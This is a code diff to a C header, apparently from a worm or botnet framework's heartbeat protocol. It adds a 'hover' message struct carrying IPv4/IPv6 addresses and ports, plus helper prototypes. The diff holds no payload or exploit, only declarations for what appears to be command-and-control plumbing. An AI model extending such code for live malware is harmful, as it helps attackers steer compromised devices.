@@ -15,6 +15,7 @@ typedef struct prne_htbt_host_info prne_htbt_host_info_t;
 typedef struct prne_htbt_msg_head prne_htbt_msg_head_t;
 typedef struct prne_htbt_cmd prne_htbt_cmd_t;
 typedef struct prne_htbt_bin_meta prne_htbt_bin_meta_t;
+typedef struct prne_htbt_hover prne_htbt_hover_t;
 typedef struct prne_htbt_stdio prne_htbt_stdio_t;
 
 typedef enum {
@@ -232,6 +233,17 @@ struct prne_htbt_bin_meta {
 	prne_htbt_cmd_t cmd;
 };
 
+struct prne_htbt_hover {
+	struct {
+		uint8_t addr[4];
+		uint16_t port;
+	} v4;
+	struct {
+		uint8_t addr[16];
+		uint16_t port;
+	} v6;
+};
+
 struct prne_htbt_stdio {
 	size_t len;
 	bool err;
@@ -301,6 +313,10 @@ bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b);
 void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb);
 void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb);
 bool prne_htbt_eq_bin_meta (const prne_htbt_bin_meta_t *a, const prne_htbt_bin_meta_t *b);
+
+void prne_htbt_init_hover (prne_htbt_hover_t *ho);
+void prne_htbt_free_hover (prne_htbt_hover_t *ho);
+bool prne_htbt_eq_hover (const prne_htbt_hover_t *a, const prne_htbt_hover_t *b);
 
 void prne_htbt_init_stdio (prne_htbt_stdio_t *s);
 void prne_htbt_free_stdio (prne_htbt_stdio_t *s);
